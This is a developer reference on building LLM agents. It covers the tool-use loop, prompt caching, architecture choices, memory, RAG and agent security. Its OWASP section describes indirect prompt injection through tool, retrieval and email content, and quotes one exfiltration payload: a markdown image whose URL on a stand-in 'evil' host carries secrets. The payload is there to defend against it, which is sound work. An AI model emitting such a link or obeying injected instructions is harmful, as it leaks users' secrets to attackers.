1. Tool Use: the Messages API loop

Claude emits tool_use blocks, your code runs them, you feed tool_result back, and you loop until stop_reason is end_turn. The Anthropic Messages API is the reference below; OpenAI (tools/tool_calls), Gemini (functionDeclarations), and Bedrock/Vertex mirror the same loop with renamed fields.

tool_choice modes

Mode Behavior Reach for it when
{"type": "auto"} Default with tools present. Claude picks a tool or answers in text. Caps at one tool call per turn. You want free choice plus extended thinking.
{"type": "any"} Claude must call some tool, never plain text. Forces exactly one. Every turn must produce an action.
{"type": "tool", "name": "X"} Forces tool X specifically. Structured output via a forced schema tool.
{"type": "none"} Forbids all tools this turn without removing the definitions. The final allowed loop turn, to force a text conclusion.

Gotcha: any and tool are incompatible with extended thinking, because Claude cannot reason before a forced call. Use auto when you want thinking together with tools. Set disable_parallel_tool_use: true inside tool_choice to force serialization.

The loop (echo the assistant turn verbatim)

python
import anthropic, json
client = anthropic.Anthropic()
MODEL = "claude-sonnet-4-5"  # verify current model IDs at write time

messages = [{"role": "user", "content": "Weather in Toronto and Montreal?"}]
MAX_ITERATIONS = 10

for i in range(MAX_ITERATIONS):
    resp = client.messages.create(
        model=MODEL, max_tokens=1024, tools=tools, messages=messages,
    )
    messages.append({"role": "assistant", "content": resp.content})  # echo verbatim

    if resp.stop_reason != "tool_use":
        final = "".join(b.text for b in resp.content if b.type == "text")
        break

    tool_results = []
    for block in resp.content:
        if block.type == "tool_use":
            try:
                out = run_tool(block.name, block.input)
                tool_results.append({
                    "type": "tool_result", "tool_use_id": block.id,
                    "content": out if isinstance(out, str) else json.dumps(out),
                })
            except Exception as e:
                tool_results.append({
                    "type": "tool_result", "tool_use_id": block.id,
                    "content": f"Error: {e}", "is_error": True,
                })
    messages.append({"role": "user", "content": tool_results})

Loop rules and gotchas

Rule Detail
Echo verbatim Append the entire prior assistant turn (including text and thinking blocks) before your tool_result user turn, or you get a 400. Echo response.content; never hand-build the turn.
Filter by block type With extended thinking on, content[0] may be a thinking/redacted_thinking block. resp.content[0].text crashes or grabs reasoning. Always filter if block.type == "text". Preserve thinking blocks unmodified when echoing, or you break signature verification.
is_error On a runtime or validation failure, set "is_error": true on the tool_result and put a short, actionable message in content ("City not found; provide a valid city"). Claude reads it and typically retries or asks the user. Do not throw your own stack unless the whole agent should die.
Loop cap Always enforce a hard max_iterations counter in production and break gracefully. Optionally switch tool_choice to "none" on the final allowed turn to force a text conclusion. Budget total tokens and wall-clock too, and log every tool_use/tool_result pair for replay.

Parallel tool calls

One assistant turn can hold multiple tool_use blocks. "Toronto and Montreal" produces two get_weather blocks in a single turn. You must return all matching tool_result blocks in the next user turn, in one message. A missing tool_use_id is a 400. With tool_choice.type == "auto" Claude is capped at one call per turn; with any or tool it is forced to exactly one.

input_schema and cost

Claude only sees name, description, and input_schema, so this is the single biggest lever on reliability. Write descriptions like docstrings (what it does, when to use it, side effects), use enum to constrain, mark required, and flatten deep nesting. The field is input_schema (Anthropic), rather than parameters (OpenAI). All tool definitions serialize into the system prompt on every request, so treat 15 to 20 tools as a practical soft ceiling before routing to sub-agents or MCP. Cache them once the set is stable (see section 2).

2. Prompt-caching cheat-sheet

Caching is the highest-ROI cost optimization for an agent, because the loop re-sends a large, stable prefix (system prompt, tool definitions, retrieved docs, prior turns) on every iteration.

Break-even and rates

Provider Cache read Cache write Break-even
Anthropic ~0.1x input price 1.25x (5-min TTL) or 2x (1-hour TTL) 2 requests at 5-min TTL, 3 at 1-hour
OpenAI ~0.1x (≈90% off) No write premium, automatic prefix caching (~1024-token min) Automatic
Gemini ~90% off cached context Implicit caching on newer models Automatic where offered
DeepSeek Already cheap at list; live page shows no separate cache-hit discount n/a n/a

Prices are approximate at the time of writing; confirm live numbers in the Toolkit. Do not cite a DeepSeek caching discount without re-checking the live page.

Add a breakpoint (Anthropic)

python
tools[-1]["cache_control"] = {"type": "ephemeral"}  # caches all tool defs above it

Adding cache_control to the last tool definition caches the whole tools-plus-system block. Later turns within the TTL read cached tokens at roughly 10% of input price.

What silently invalidates a cache

Caching is a prefix match. Any byte change anywhere in the prefix invalidates everything after it. The classic silent killers:

  • A datetime.now() or UUID interpolated into the system prompt.
  • Non-deterministic JSON serialization (unsorted keys).
  • Changing the tool set mid-conversation.

Keep the system prompt frozen, serialize tools deterministically, and put volatile content after the last cache breakpoint. Verify with cache_read_input_tokens; if it is zero across identical-prefix requests, you have a silent invalidator.

Batch discount

Every major provider offers 50% off both input and output for asynchronous jobs with a 24-hour SLA (Anthropic Message Batches, OpenAI Batch, Google Batch). Use it for anything not blocking a user: nightly evals, bulk classification and extraction, synthetic data, backfills, LLM-judge grading, embedding large corpora. A workhorse-tier workload that is cached and batched can land near lightweight-tier list price while keeping workhorse quality, roughly a 95% reduction versus naive per-request frontier calls. The tradeoff is latency, so treat batch as a throughput tool rather than a request/response tool.

Cascade vs router

Pattern How it works Watch out for
Cascade Run the cheapest model first; escalate only when a confidence signal fails (self-reported low confidence, a validator/schema failure, a grounding check, or a cheap judge scoring below threshold). Well-tuned, it cuts spend 50 to 80% with negligible quality loss. The escalation tax: escalating on 40% of traffic pays for both the cheap and the frontier call on those. Tune the threshold against measured escalation rate.
Router A tiny classifier (lightweight tier) tags each request by difficulty/domain and dispatches to the right tier directly, avoiding the double-inference cost of a cascade on hard requests. Misroutes are silent and expensive downstream. Add a fallback route and log it.

Route by task rather than globally: the planner can be frontier while workers cascade.

Token budgeting for agent loops

The dominant cost is the re-sent context growing every turn, which dwarfs the final answer. A 20-turn loop with a 50K-token accumulated context re-sends roughly 1M input tokens total even when each turn's new output is tiny.

  • Caching is mandatory for any loop beyond a few turns.
  • Cap the loop. Use provider task budgets (a token ceiling the model paces against, distinct from max_tokens which is a hard cutoff) or your own max_iterations guard.
  • Prune and compact. Context editing (clear stale tool results) and compaction (summarize old turns) keep the re-sent prefix from ballooning.
  • Right-size effort. On current reasoning models, low/medium often matches last-generation high. Sweep effort on your eval set rather than trusting carried-over defaults.

3. Which agent architecture when (decision list)

Prefer a workflow (fixed code paths with LLM calls at defined steps) and graduate to an autonomous agent only when the task genuinely needs dynamic control flow. Complexity is a cost you pay in latency, tokens, and failure modes, so buy it only when the task requires it.

If the task is... Use...
Steps are known and fixed Workflow (prompt chaining / code), rather than an agent
Input type varies, treatments differ Router, optionally in front of anything below
Open-ended, next step depends on observations Core loop / ReAct (the default)
Structured, multi-step, parallelizable, want plan approval or cheaper execution Plan-and-execute with re-planning
Output is checkable and iteration helps (tests / rubric / verifier) Reflection / evaluator-optimizer
Retryable task with a reward signal, multiple attempts allowed Reflexion (cross-episode memory)
Breadth-heavy, parallelizable, exceeds one context window Orchestrator-worker multi-agent
Genuine combinatorial search with verifiable states Tree-of-Thoughts / search; first try self-consistency or best-of-N + verifier (usually enough, far cheaper)
In doubt Start with ReAct + strong tools + a verification gate; add reflection or sub-agents only where measurement shows a gap

Cost and latency rise sharply down the list: workflow < ReAct < reflection (×rounds) < plan-execute < multi-agent (×sub-agents) < ToT (×branches). Reliability is non-monotonic in complexity: more agents and deeper search add coordination and compounding-error risk. Reliability comes from grounding in real feedback, bounded loops, context management, and verification gates, rather than from the fanciness of the reasoning pattern.

4. The four types of agent memory

Treat the context window as a scarce, curated resource. Roughly 65% of enterprise agent failures in 2025 traced to context rot or memory loss during multi-step reasoning, rather than raw window overflow. The best agents combine all four types below.

Type What it is Use for Gotcha
In-context (working memory) What the model holds right now: system prompt, recent turns, scratchpad The immediate task; fastest, zero-latency Volatile and token-expensive; padding with "just in case" context measurably degrades output (lost-in-the-middle)
External files / state Durable working memory on disk: JSON state blobs, append-only logs, a SESSION_STATUS.md-style doc Cross-session continuity and human-auditable state Files silently drift from reality if updated lazily; enforce writes with a stop-hook rather than good intentions
Vector / semantic Embeddings in a vector DB for fuzzy "what's relevant to this query" recall Knowledge bases, docs, past-conversation recall at scale Semantic similarity is not relevance; without re-ranking you retrieve plausible-but-wrong chunks
Structured DB SQL/graph rows with exact schema: profiles, entities, facts, task queues Precise filtering, joins, transactional updates, auditability The model must know the schema; expose it as a tool rather than raw SQL access

The through-line: retrieval is not memory. Memory is the system: what gets written, when it is compacted, what is authoritative, and how the agent decides what to pull into a deliberately small window. Model the write path and the eviction policy as carefully as the read path.

5. The 2026 RAG pipeline

RAG is the answer whenever your source of truth changes and must be attributable. The consensus pipeline:

query → (optional) query rewrite → hybrid retrieval (dense top-N + BM25 top-N, fused via Reciprocal Rank Fusion) → re-rank (cross-encoder) → top 5-8 → context builder → LLM

Stage What to do Gotcha
Chunking (highest-leverage lever) Prefer semantic chunking (break where cosine distance between adjacent sentences spikes) or parent-child / small-to-big (embed small chunks for precise matching, feed the parent section to the LLM) Fixed 512-token chunks split tables, code, and clauses mid-thought; bad chunking guarantees failure even with strong embeddings
Embeddings Use a current model (Voyage, OpenAI text-embedding-3, Cohere Embed, or open bge/e5); match model to domain Test recall rather than assuming
Hybrid search Dense (semantic) + sparse BM25 (exact terms, IDs, rare tokens) fused with weighted RRF Dense alone misses literal matches like error codes and SKUs
Re-ranking Retrieve ~20 to 100 candidates, re-rank with a cross-encoder (Cohere Rerank 3.5, Voyage rerank, or FlashRank locally) to top 5-8 20 to 5 is the sweet spot; re-ranking 100+ candidates rarely pays off

RAG vs long-context vs fine-tune: use RAG when the corpus is large, changing, or needs citations. Use fine-tuning to teach behavior, format, or tone rather than facts. Use long-context (or Cache-Augmented Generation) when the corpus is small and stable enough to fit the window.

6. OWASP LLM Top-10, agent manifestation, and the primary control

An agent acts, so security is about constraining the blast radius of a compromised reasoning loop. Treat the model as a permanently untrusted, occasionally-hijacked component and engineer around it. There is still no model-level fix for prompt injection; assume it will succeed sometimes and make sure the permission layer bounds the damage.

OWASP 2025 Agent-specific manifestation Primary control
LLM01 Prompt Injection Indirect injection via tool / RAG / email output Dual-LLM / CaMeL, taint tracking, allowlists
LLM02 Sensitive Info Disclosure Exfiltration via legitimate tools / URLs Egress allowlist, no secrets in context
LLM03 Supply Chain Poisoned or rug-pulled MCP servers and tools Pin and diff definitions, sandbox, vet sources
LLM04 Data/Model Poisoning Corrupted RAG corpus Provenance, source integrity
LLM05 Improper Output Handling LLM output flows into a shell / SQL / DOM sink Validate and escape at every sink
LLM06 Excessive Agency God-tools, borrowed admin token Least privilege, scoped agent identity
LLM07 System Prompt Leakage Extracted prompt reveals secrets or logic Keep secrets out of the prompt entirely
LLM08 Vector/Embedding Weaknesses Cross-tenant RAG leakage Namespace isolation, retrieval ACLs
LLM09 Misinformation Fabrication drives a bad action Grounding, human-in-the-loop on high-stakes
LLM10 Unbounded Consumption Runaway loops, recursive spawns Iteration and budget caps, kill switch

Injection defenses, strongest to weakest: dual-LLM / quarantine (CaMeL) with provenance/taint tracking and capability-gated tool calls; allowlists and structural separation of untrusted content; taint tracking that forbids high-privilege calls whose arguments derive from tainted data. Exfiltration rides legitimate channels, so a markdown image such as ![](https://evil/?d=<secrets>) is a silent GET; sanitize rendered output and constrain outbound egress at the sandbox level.

7. Operator security checklist

  • [ ] Identity: the agent runs under its own scoped service identity, never a borrowed admin or user token.
  • [ ] Least privilege: every tool scoped to the narrowest capability; read-only by default; no god-tools. Prefer many narrow tools and enumerated destructive operations over one tool that composes arbitrary SQL or shell.
  • [ ] Trust boundary: untrusted content (web, RAG, email, tool output, MCP descriptions) is delimited and taint-tracked; high-privilege calls with tainted arguments are blocked.
  • [ ] HITL gates: irreversible actions (pay, send, post, deploy, delete) require human confirmation showing resolved payload values rather than the model's summary. Gate only the irreversible set so approvals stay real.
  • [ ] Secrets: in vault or env only; injected at the tool boundary so the model sees handles rather than values; rotated on schedule and on suspected leak; never in prompts, traces, or logs.
  • [ ] Sandbox: code execution in ephemeral, non-root, network-deny-by-default containers or microVMs with CPU, memory, and wall-clock limits.
  • [ ] Egress control: outbound destinations allowlisted; block recipients and URLs sourced from untrusted content; no data in query strings.
  • [ ] Runaway controls: per-run caps on iterations, tool calls, wall-clock, and dollars (counting retries and sub-agents); loop detection; concurrency limit; operator kill switch.
  • [ ] Output handling: validate and escape every LLM output before it reaches a shell, query, browser, or renderer.
  • [ ] Supply chain: pin and diff tool and MCP definitions each load; sandbox each server; vet or self-host; pin package versions.
  • [ ] Audit: immutable, redacted, queryable logs of prompts, context (with trust labels), tool calls, decisions, approvals, and cost.
  • [ ] Assume breach: design so a successful injection is bounded by the permission layer rather than the prompt; red-team with AgentDojo-style indirect-injection suites before shipping.
